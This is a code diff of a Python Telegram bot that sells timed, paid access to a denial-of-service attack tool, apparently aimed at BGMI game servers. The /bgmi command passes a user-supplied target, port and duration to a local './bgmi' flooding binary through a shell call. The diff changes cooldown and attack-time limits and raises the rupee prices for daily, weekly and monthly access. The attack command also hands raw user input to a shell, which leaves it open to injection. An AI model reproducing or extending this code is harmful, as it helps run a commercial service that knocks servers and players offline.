@@ -25,7 +25,7 @@ LOG_FILE = "log.txt"
 KEY_FILE = "keys.json"
 
 # Cooldown time for users
-COOLDOWN_TIME = 60  # 1 minutes 
+COOLDOWN_TIME = 300  #  1minutes 
 
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
@@ -130,7 +130,7 @@ def redeem_key_command(message):
             save_users(users)
             del keys[key]
             save_keys(keys)
-            response = f"Key redeemed successfully! Access granted until: {expiration_date}"
+            response = f"✅Key redeemed successfully! Access granted until: {expiration_date}"
         else:
             response = "Invalid or expired key."
     else:
@@ -157,17 +157,17 @@ def handle_bgmi(message):
                 target = command[1]
                 port = int(command[2])
                 time = int(command[3])
-                if time > 300:
-                    response = "Error: Time interval must be less than 300 seconds."
+                if time > 180:
+                    response = "Error: Time interval must be less than 180 seconds."
                 else:
                     record_command_logs(user_id, '/bgmi', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
-                    full_command = f"./bgmi {target} {port} {time} 350"
+                    full_command = f"./bgmi {target} {port} {time} 305"
                     subprocess.run(full_command, shell=True)
                     response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
             else:
-                response = "Usage: /bgmi <target> <port> <time>"
+                response = "✅Usage: /bgmi <target> <port> <time>"
         else:
             response = "Your access has expired. Please redeem a new key."
     else:
@@ -300,9 +300,9 @@ VIP 🌟:
 -> Concurrent attacks: 3
 
 Price list 💸:
-Day: 100 Rs
-Week: 400 Rs
-Month: 800 Rs
+Day: 200 Rs
+Week: 700 Rs
+Month: 1800 Rs
 '''
     bot.reply_to(message, response)
 
